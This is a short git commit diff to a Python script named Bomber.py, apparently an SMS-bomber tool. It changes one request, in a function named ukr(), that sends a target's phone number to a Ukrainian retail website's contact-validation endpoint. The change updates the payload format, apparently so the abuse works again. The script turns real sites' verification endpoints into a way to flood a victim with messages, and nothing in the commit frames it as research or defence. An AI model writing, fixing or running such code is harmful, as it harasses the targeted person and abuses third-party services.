2f60072865f3648f1ce4c9b68f7cca24d82ad45a
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-26 01:34:01 +0200

    Add files via upload

--- Bomber.py
+++ Bomber.py
@@ -57,7 +57,7 @@ def ukr():
                 except:
                         pass
                 try:
-                        requests.post("https://md-fashion.com.ua/bpm/validate-contact", data={'phone' : number},  headers=headers)
+                        requests.post("https://md-fashion.com.ua/bpm/validate-contact", json={"phone": "+" + number}, headers=headers)
                 except:
                         pass
 
